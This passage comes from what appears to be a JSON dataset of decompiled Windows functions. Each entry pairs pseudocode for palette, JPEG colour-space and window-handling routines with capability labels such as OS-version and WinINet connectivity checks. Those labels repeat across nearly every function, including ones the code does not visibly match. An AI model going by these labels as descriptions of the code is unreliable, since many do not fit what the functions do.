param_2[0x6a];\n        puStack44 = &stack0xfffffffc;\n    }\n    fcn.00445108();\n    *(*(in_EAX + 0x334) + 100) = in_EAX;\n    if ((*(param_2 + 0x19b) == '\\0') && (param_2[0x69] == 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        *0x496608 = fcn.00471004();\n        *0x496600 = in_EAX;\n        fcn.00475c18();\n    }\n    puStackY60 = 0x475fd5;\n    fcn.00446870(0);\n    uStackY64 = 0x4760b3;\n    uStackY68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStackY60 = &stack0xfffffffc;\n    fcn.00444f5c();\n    fcn.00406c34();\n    fcn.0044502c();\n    fcn.0043e204();\n    *(in_EAX + 0x341) = 1;\n    fcn.00460b38();\n    fcn.0045f900();\n    sub.user32.dll_GetSystemMetrics();\n    fcn.0043c3c4();\n    iVar2 = fcn.0046cb64();\n    if (iVar2 == 0x50050) {\n        (**(*param_2 + 0x80))();\n    }\n    (**(**(in_EAX + 0x334) + 0x40))();\n    uVar3 = 0;\n    *in_FS_OFFSET = 0xf;\n    uStackY64 = 0x4760ba;\n    if (bVar1) {\n        uStackY68 = 0x4760b2;\n        uVar3 = fcn.00475c50();\n    }\n    return uVar3;\n}\n",
        "token_count": 995
    },
    "00476124": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00476124(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(*(*(arg_8h + -4) + 0x268) + 8);\n    if (-1 < iVar3 + -1) {\n        do {\n            fcn.00414eec();\n            cVar1 = fcn.004040e4();\n            if ((cVar1 != '\\0') && (iVar2 = fcn.00414eec(),  *(iVar2 + 0x1a4) != 0)) {\n                return 1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 174
    },
    "00476190": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476190(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x331) == '\\0') {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (((cVar1 != '\\0') && (*(in_EAX + 0x1da) != '\\0')) &&\n           ((*(in_EAX + 0xa2) != '\\0' || (*(in_EAX + 0x97) != '\\0')))) {\n            cVar1 = fcn.00476124(&stack0xfffffffc);\n            if ((((cVar1 != '\\0') && ((*(param_2 + 4) & 0xfff0) == 0xf100)) && (*(param_2 + 8) != 0x20)) &&\n               (*(param_2 + 8) != 0x2d)) {\n                iVar2 = sub.user32.dll_GetCapture();\n                if (iVar2 == 0) {\n                    if (*(param_2 + 8) == 0) {\n                        iVar2 = 0;\n                    }\n                    else {\n                        iVar2 = fcn.00474d60();\n                    }\n                    if ((*(param_2 + 8) == 0) ||\n                       ((iVar2 != 0 && ((*(in_EAX + 0x97) == '\\0' || (*(iVar2 + 0x19c) < 0x80000000)))))) {\n                        fcn.00404154();\n                        *(param_2 + 0xc) = 1;\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 387
    },
    "00476398": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00476398(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    uchar uVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    piVar1 = *0x492b60;\n    if (*(in_EAX + 0x331) == '\\0') {\n        puStack20 = 0x4763d7;\n        fcn.00404154();\n        uStack24 = 0x476431;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        *(in_EAX + 0x331) = 1;\n        puStack20 = &stack0xfffffffc;\n        do {\n            fcn.00462414();\n            if (*(*piVar1 + 0xa4) != '\\0') {\n                *(in_EAX + 0x331) = 0;\n            }\n        } while (*(in_EAX + 0x331) != '\\0');\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x476438;\n        uStack24 = 0x476430;\n        uVar2 = fcn.00404154();\n        return uVar2;\n    }\n    if (param_2 != 0) {\n        puStack20 = 0x4763c3;\n        fcn.00404154();\n    }\n    return param_2 != 0;\n}\n",
        "token_count": 349
    },
    "004769b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004769b0(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x476a1f;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack16;\n    *0x4965ec = *0x4965ec + 1;\n    if (*0x4965ec == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x4965f0 != 0) {\n            iStack20 = *0x4965f0;\n            sub.kernel32.dll_FreeLibrary_1();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x4965f4 != 0) {\n            sub.kernel32.dll_FreeLibrary_1(*0x4965f4);\n        }\n        fcn.004058e0();\n        fcn.004058e0();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 269
    },
    "00476fbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00476fbc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xb8) != 0) {\n        fcn.00483880();\n        *(in_EAX + 0xb8) = 0;\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "00476fe0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00476fe0(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint uVar4;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x476ffb;\n    fcn.00403720();\n    puVar2 = 0x491efc;\n    puVar3 = param_2;\n    for (iVar1 = 0x21; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    param_2[0x2e] = param_2;\n    puStack24 = 0x47702f;\n    fcn.00478080();\n    uStack28 = 0x4771d0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    param_2[0x21] = 0x476ec8;\n    param_2[0x26] = in_EAX;\n    param_2[0x30] = param_2 + 0x21;\n    uVar4 = 0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00417550(0, 0);\n    fcn.004797ec();\n    fcn.00478348();\n    param_2[0x3a] = 1;\n    param_2[0x3b] = 1 << (*(in_EAX + 0x43) & 0x1f);\n    param_2[0x42] = -(*(in_EAX + 0x3c) != '\\0');\n    if (*(in_EAX + 0x3d) != '\\0') {\n        param_2[0x39] = 1;\n    }\n    if ((*(in_EAX + 0x3e) == '\\x01') || (param_2[0x39] == 1)) {\n        param_2[0x43] = 0xffffffff;\n        param_2[0x46] = 0xec;\n    }\n    if (*(in_EAX + 0x42) == '\\x01') {\n        param_2[0x40] = 1;\n        param_2[0x45] = 0;\n        param_2[0x44] = 1;\n    }\n    param_2[0x2b] = param_2[0x40];\n    *(param_2 + 0x2c) = '\\x01' - (param_2[0x45] == 0);\n    param_2[0x2d] = param_2[0x44];\n    if (*(in_EAX + 0x40) != '\\0') {\n        iVar1 = fcn.00478494();\n        if (iVar1 != 0) {\n            param_2[0x49] = param_2[0x45];\n            param_2[0x40] = 1;\n            param_2[0x45] = 0;\n            param_2[0x44] = 1;\n            param_2[0x3e] = 0xffffffff;\n        }\n    }\n    *in_FS_OFFSET = uVar4;\n    return;\n}\n",
        "token_count": 789
    },
    "004771f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004771f0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack668;\n    uint uStack664;\n    uchar *puStack660;\n    uint var_288h;\n    uint var_1d0h;\n    uint var_1c8h;\n    uint var_160h;\n    uint var_15ch;\n    \n    if (*(in_EAX + 0x44) != '\\0') {\n        puStack660 = 0x47720f;\n        fcn.00476fe0();\n        uStack664 = 0x47726f;\n        uStack668 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd64;\n        puStack660 = &stack0xfffffffc;\n        fcn.00479c94();\n        *(in_EAX + 0x30) = var_160h;\n        *(in_EAX + 0x34) = var_15ch;\n        iVar1 = fcn.00478494();\n        *(in_EAX + 0x41) = '\\x01' - (iVar1 == 0);\n        *in_FS_OFFSET = uStack668;\n        puStack660 = 0x477276;\n        uStack664 = 0x47726e;\n        fcn.00476fbc();\n        return;\n    }\n    return;\n}\n",
        "token_count": 306
    },
    "00477284": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00477284(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint uStack776;\n    uint uStack772;\n    uchar *puStack768;\n    uint uStack764;\n    uint *puStack760;\n    uint uStack740;\n    uint uStack736;\n    uchar *puStack732;\n    uint uStack720;\n    uint uStack716;\n    uchar *puStack712;\n    uint uStack708;\n    uint uStack704;\n    uchar *puStack700;\n    uint var_2a8h;\n    uint var_298h;\n    uint var_214h;\n    int32_t var_200h;\n    uint *var_1e0h;\n    uint *var_1d8h;\n    uint var_1c4h;\n    uint32_t var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint32_t var_104h;\n    int32_t *var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    puStack712 = &stack0xfffffffc;\n    puStack700 = 0x4772a5;\n    var_4h = in_EAX;\n    fcn.00403720();\n    puVar5 = 0x491efc;\n    puVar6 = &fcn.00477284::var_298h;\n    for (iVar3 = 0x21; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    var_1e0h = &fcn.00477284::var_298h;\n    puStack700 = 0x4772d8;\n    fcn.004845cc();\n    uStack704 = 0x4775f0;\n    uStack708 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd3c;\n    uStack716 = 0x4775b9;\n    uStack720 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffd30;\n    var_214h = 0x476ec8;\n    var_200h = var_4h;\n    var_1d8h = &fcn.00477284::var_214h;\n    puVar1 = &stack0xfffffffc;\n    puStack700 = &stack0xfffffffc;\n    if (*(*(var_4h + 0x28) + 8) != 0) {\n        puStack700 = &stack0xfffffffc;\n        fcn.00477d20();\n        puVar1 = puStack712;\n    }\n    puStack712 = puVar1;\n    uVar2 = fcn.00403f28();\n    *(*(var_4h + 0x28) + 8) = uVar2;\n    uVar2 = 0;\n    puStack732 = 0x477349;\n    fcn.00417550(0, 0);\n    puStack732 = 0x47735d;\n    fcn.004839a0();\n    if (*(var_4h + 0x2c) != NULL) {\n        puStack732 = 0x47736e;\n        iVar3 = (**(**(var_4h + 0x2c) + 0x2c))();\n        if (iVar3 != 0) {\n            puStack732 = 0x47737d;\n            iVar3 = (**(**(var_4h + 0x2c) + 0x20))();\n            if (iVar3 != 0) {\n                puStack732 = 0x47739e;\n                var_1c4h = (**(**(var_4h + 0x2c) + 0x2c))();\n                puStack732 = 0x4773af;\n                uVar2 = (**(**(var_4h + 0x2c) + 0x2c))();\n                *(*(var_4h + 0x28) + 0x10) = uVar2;\n                puStack732 = 0x4773c3;\n                var_1c0h = (**(**(var_4h + 0x2c) + 0x20))();\n                puStack732 = 0x4773d4;\n                uVar2 = (**(**(var_4h + 0x2c) + 0x20))();\n                *(*(var_4h + 0x28) + 0xc) = uVar2;\n                var_1bch = 3;\n                var_1b8h = 2;\n                puStack732 = 0x4773fd;\n                var_10h = fcn.00426010();\n                uStack736 = 0x4775a8;\n                uStack740 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffd1c;\n                puStack732 = &stack0xfffffffc;\n                (**(*var_10h + 8))();\n                fcn.004275c4();\n                fcn.00483bf8();\n                fcn.00483afc();\n                if (*(var_4h + 0x3d) != '\\0') {\n                    *(*(var_4h + 0x28) + 0x14) = 1;\n                    fcn.00483d6c();\n                }\n                if (*(var_4h + 0x41) != '\\0') {\n                    fcn.004841d4();\n                }\n                var_ch = fcn.00426754();\n                iVar3 = fcn.00426754();\n                uVar4 = iVar3 - var_ch;\n                if ((uVar4 < 1) || ((uVar4 & 3) != 0)) {\n                    var_8h = 1;\n                }\n                else {\n                    var_8h = var_1c0h;\n                }\n                puStack760 = 0x4774cf;\n                fcn.00413a94(&fcn.00477284::var_2a8h, 0);\n                puStack760 = &fcn.00477284::var_2a8h;\n                uStack764 = 0;\n                puStack768 = 0x4774e9;\n                fcn.00404154();\n                uStack772 = 0x47758b;\n                uStack776 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffcf8;\n                puStack768 = &stack0xfffffffc;\n                fcn.004843ec();\n                while (var_104h < var_1c0h) {\n                    iVar3 = fcn.00484460();\n                    var_ch = var_ch + uVar4 * iVar3;\n                }\n                fcn.004846ec();\n                *in_FS_OFFSET = uStack776;\n                puStack768 = 0x477592;\n                uStack772 = 0x47754c;\n                iVar3 = fcn.00402d68();\n                if (iVar3 == 0) {\n                    uStack772 = 100;\n                }\n                else {\n                    uStack772 = 0;\n                }\n                uStack776 = 0;\n                fcn.00413a94(&fcn.00477284::var_2a8h, 0);\n                fcn.00404154(0, &fcn.00477284::var_2a8h);\n                return;\n            }\n        }\n    }\n    *in_FS_OFFSET = uVar2;\n    uStack720 = 0x47738e;\n    fcn.00404878();\n    return;\n}\n",
        "token_count": 1749
    },
    "0047767c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0047767c(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uVar4;\n    ushort uStack1036;\n    uint16_t uStack1034;\n    uchar auStack1032 [1024];\n    \n    uStack1036 = 0x300;\n    uStack1034 = *(in_EAX + 0x84);\n    if (*(in_EAX + 0x2c) == 1) {\n        uVar4 = uStack1034;\n        if (-1 < uVar4 - 1) {\n            iVar2 = 0;\n            puVar3 = auStack1032;\n            do {\n                uVar1 = *(**(in_EAX + 0x88) + iVar2);\n                *puVar3 = uVar1;\n                puVar3[1] = uVar1;\n                puVar3[2] = uVar1;\n                puVar3[3] = 0;\n                iVar2 = iVar2 + 1;\n                puVar3 = puVar3 + 4;\n                uVar4 = uVar4 - 1;\n            } while (uVar4 != 0);\n        }\n    }\n    else {\n        uVar4 = uStack1034;\n        if (-1 < uVar4 - 1) {\n            iVar2 = 0;\n            puVar3 = auStack1032;\n            do {\n                *puVar3 = *(*(*(in_EAX + 0x88) + 8) + iVar2);\n                puVar3[1] = *(*(*(in_EAX + 0x88) + 4) + iVar2);\n                puVar3[2] = *(**(in_EAX + 0x88) + iVar2);\n                puVar3[3] = 0;\n                iVar2 = iVar2 + 1;\n                puVar3 = puVar3 + 4;\n                uVar4 = uVar4 - 1;\n            } while (uVar4 != 0);\n        }\n    }\n    sub.gdi32.dll_CreatePalette(&uStack1036);\n    return;\n}\n",
        "token_count": 476
    },
    "004777b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.004777b4(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uVar6;\n    int32_t in_stack_fffffd08;\n    int32_t iStack756;\n    uint uStack752;\n    uchar *puStack748;\n    uint uStack744;\n    uint *puStack740;\n    int32_t iStack720;\n    uint uStack716;\n    uchar *puStack712;\n    int32_t iStack708;\n    uint uStack704;\n    uchar *puStack700;\n    uint var_2a8h;\n    uint var_298h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    int32_t var_1d8h;\n    int32_t var_1b4h;\n    int32_t var_1a0h;\n    uint var_198h;\n    uint var_188h;\n    uint var_184h;\n    uint var_170h;\n    uint32_t var_16ch;\n    uint var_160h;\n    int32_t var_158h;\n    uint32_t var_154h;\n    uint var_150h;\n    int32_t var_dh;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    puStack712 = &stack0xfffffffc;\n    var_8h = in_EAX[0xb];\n    if (var_8h == NULL) {\n        puStack700 = 0x4777e6;\n        var_4h = in_EAX;\n        iVar3 = fcn.00426010();\n        var_4h[0xb] = iVar3;\n        var_8h = var_4h[0xb];\n        var_dh._0_1_ = '\\x01';\n        puStack700 = 0x477807;\n        fcn.00476fe0();\n        uStack704 = 0x477bb1;\n        iStack708 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd3c;\n        uStack716 = 0x477b82;\n        iStack720 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd30;\n        puStack700 = &stack0xfffffffc;\n        fcn.00427258();\n        if ((*(var_4h + 0x3e) == '\\x01') || (var_1b4h == 1)) {\n            fcn.004275c4();\n        }\n        else {\n            fcn.004275c4();\n        }\n        puStack740 = 0x477876;\n        fcn.00413a94(&fcn.004777b4::var_2a8h, 0);\n        puStack740 = &fcn.004777b4::var_2a8h;\n        uStack744 = 0;\n        puStack748 = 0x477890;\n        fcn.00404154();\n        uStack752 = 0x477b71;\n        iStack756 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd0c;\n        iVar3 = var_4h[0xe];\n        puStack748 = &stack0xfffffffc;\n        if (iVar3 != 0) {\n            if (*(var_4h + 0x3e) == '\\x01') {\n                puStack748 = &stack0xfffffffc;\n                fcn.00477728();\n                fcn.00425da0();\n                in_stack_fffffd08 = 0x4778d6;\n                (**(*var_4h[0xb] + 0x38))();\n                var_dh._0_1_ = '\\0';\n            }\n            else {\n                puStack748 = &stack0xfffffffc;\n                sub.gdi32.dll_DeleteObject();\n                var_4h[0xe] = 0;\n                in_stack_fffffd08 = iVar3;\n            }\n        }\n        fcn.00479858();\n        piVar1 = var_4h[0xb];\n        fcn.00427258();\n        (**(*piVar1 + 0x40))();\n        (**(*piVar1 + 0x34))();\n        *NULL = fcn.00426754();\n        iVar3 = fcn.00426754();\n        iVar3 = iVar3 - stack0xfffffff0;\n        if (var_1a0h != 0) {\n            while (iVar4 = fcn.004783b4(),  iVar4 != 2) {\n                fcn.00479b1c();\n                if ((((*(var_1d8h + 0xc) == 0) && (var_158h != 0)) && (cVar2 = fcn.004266d0(),  cVar2 == '\\x03')) &&\n                   (var_dh != '\\0')) {\n                    fcn.0047767c();\n                    (**(*var_4h[0xb] + 0x38))();\n                    *(var_4h + 0x22) = 1;\n                }\n                *NULL = fcn.00426754();\n                while (var_154h < var_16ch) {\n                    iVar4 = fcn.004799e0();\n                    unique0x00007a00 = stack0xfffffff0 + iVar3 * iVar4;\n                }\n                fcn.00479b7c();\n            }\n            var_198h = var_1ech;\n            var_188h = var_1e4h;\n            if (var_1e8h != '\\0') {\n                var_184h = 0xffffffff;\n                var_158h = 0;\n            }\n            fcn.00479b1c();\n            *NULL = fcn.00426754();\n        }\n        if (((var_1a0h == 0) || (var_1e8h != '\\0')) && ((var_158h != 0 && (var_dh != '\\0')))) {\n            fcn.0047767c();\n            (**(*var_4h[0xb] + 0x38))();\n            *(var_4h + 0x22) = 1;\n            *NULL = fcn.00426754();\n        }\n        while (var_154h < var_16ch) {\n            iVar4 = fcn.004799e0();\n            unique0x00007a00 = stack0xfffffff0 + iVar3 * iVar4;\n        }\n        if (var_1a0h != 0) {\n            fcn.00479b7c();\n        }\n        fcn.004784c8();\n        *in_FS_OFFSET = in_stack_fffffd08;\n        uStack752 = 0x477b78;\n        iStack756 = 0x477b16;\n        iVar3 = fcn.00402d68();\n        if (iVar3 == 0) {\n            iStack756 = 100;\n        }\n        else {\n            iStack756 = 0;\n        }\n        uVar5 = *(var_4h + 0x22);\n        uVar6 = 0;\n        arg_8h = &fcn.004777b4::var_2a8h;\n        fcn.00413a94(arg_8h, 0);\n        fcn.00404154(0, &fcn.004777b4::var_2a8h, arg_8h, uVar6, uVar5);\n        if (*(var_4h + 0x22) != '\\0') {\n            var_4h = (**(*var_4h + 0x10))();\n        }\n        return var_4h;\n    }\n    return var_8h;\n}\n",
        "token_count": 1761
    },
    "00477d74": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00477d74(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint uStack640;\n    uint uStack636;\n    uchar *puStack632;\n    uint var_25ch;\n    uint var_240h;\n    uint var_23ch;\n    int32_t var_234h;\n    uint var_8ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_EAX;\n    fcn.00477d20();\n    fcn.00403f58();\n    var_4h[0xb] = 0;\n    iVar2 = var_4h[10];\n    uVar1 = fcn.00403f28();\n    *(iVar2 + 8) = uVar1;\n    puStack632 = 0x477dc6;\n    fcn.004175b4(param_2, param_2 >> 0x1f);\n    puStack632 = 0x477dd6;\n    fcn.0041775c();\n    if (0 < param_2) {\n        puVar4 = 0x491efc;\n        puVar5 = &fcn.00477d74::var_8ch;\n        for (iVar3 = 0x21; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        puStack632 = 0x477e11;\n        fcn.00478080();\n        uStack636 = 0x477e96;\n        uStack640 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd80;\n        uVar1 = 0;\n        puStack632 = &stack0xfffffffc;\n        fcn.00417550(0, 0);\n        fcn.004797ec();\n        fcn.00478348();\n        *(iVar2 + 0x10) = var_240h;\n        *(iVar2 + 0xc) = var_23ch;\n        *(iVar2 + 0x14) = var_234h == 1;\n        iVar2 = fcn.00478494();\n        *(var_4h + 0x41) = '\\x01' - (iVar2 == 0);\n        *in_FS_OFFSET = uVar1;\n        uStack640 = 0x477e9d;\n        fcn.00478150();\n        return;\n    }\n    *(var_4h + 0x22) = 1;\n    puStack632 = 0x477eaf;\n    (**(*var_4h + 0x10))();\n    return;\n}\n",
        "token_count": 656
    },
    "00478160": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00478160(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EAX;\n    \n    iVar1 = in_EAX[9];\n    if (iVar1 == 1) {\n        in_EAX[10] = 1;\n        in_EAX[0xb] = 1;\n    }\n    else if (iVar1 == 3) {\n        if (in_EAX[0x46] == 0) {\n            if (in_EAX[0x49] == 0) {\n                piVar2 = in_EAX[0x36];\n                iVar1 = *piVar2;\n                iVar3 = piVar2[0x15];\n                iVar4 = piVar2[0x2a];\n                if (((iVar1 == 1) && (iVar3 == 2)) && (iVar4 == 3)) {\n                    in_EAX[10] = 3;\n                }\n                else if (((iVar1 == 0x52) && (iVar3 == 0x47)) && (iVar4 == 0x42)) {\n                    in_EAX[10] = 2;\n                }\n                else {\n                    iVar5 = *in_EAX;\n                    *(iVar5 + 0x18) = iVar1;\n                    *(iVar5 + 0x1c) = iVar3;\n                    *(iVar5 + 0x20) = iVar4;\n                    *(*in_EAX + 0x14) = 0x6f;\n                    (**(*in_EAX + 4))();\n                    in_EAX[10] = 3;\n                }\n            }\n            else if (*(in_EAX + 0x4a) == '\\0') {\n                in_EAX[10] = 2;\n            }\n            else if (*(in_EAX + 0x4a) == '\\x01') {\n                in_EAX[10] = 3;\n            }\n            else {\n                iVar1 = *in_EAX;\n                *(iVar1 + 0x14) = 0x72;\n                *(iVar1 + 0x18) = *(in_EAX + 0x4a);\n                (**(*in_EAX + 4))();\n                in_EAX[10] = 3;\n            }\n        }\n        else {\n            in_EAX[10] = 3;\n        }\n        in_EAX[0xb] = 2;\n    }\n    else if (iVar1 == 4) {\n        if (in_EAX[0x49] == 0) {\n            in_EAX[10] = 4;\n        }\n        else if (*(in_EAX + 0x4a) == '\\0') {\n            in_EAX[10] = 4;\n        }\n        else if (*(in_EAX + 0x4a) == '\\x02') {\n            in_EAX[10] = 5;\n        }\n        else {\n            iVar1 = *in_EAX;\n            *(iVar1 + 0x14) = 0x72;\n            *(iVar1 + 0x18) = *(in_EAX + 0x4a);\n            (**(*in_EAX + 4))();\n            in_EAX[10] = 5;\n        }\n        in_EAX[0xb] = 4;\n    }\n    else {\n        in_EAX[10] = 0;\n        in_EAX[0xb] = 0;\n    }\n    in_EAX[0xc] = 1;\n    in_EAX[0xd] = 1;\n    in_EAX[0xe] = 0;\n    in_EAX[0xf] = 0x3ff00000;\n    in_EAX[0x10] = 0;\n    in_EAX[0x11] = 0;\n    in_EAX[0x12] = 2;\n    in_EAX[0x13] = 1;\n    in_EAX[0x14] = 1;\n    in_EAX[0x15] = 0;\n    in_EAX[0x16] = 2;\n    in_EAX[0x17] = 1;\n    in_EAX[0x18] = 0x100;\n    in_EAX[0x22] = 0;\n    in_EAX[0x19] = 0;\n    in_EAX[0x1a] = 0;\n    in_EAX[0x1b] = 0;\n    return;\n}\n",
        "token_count": 999
    },
    "004783b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
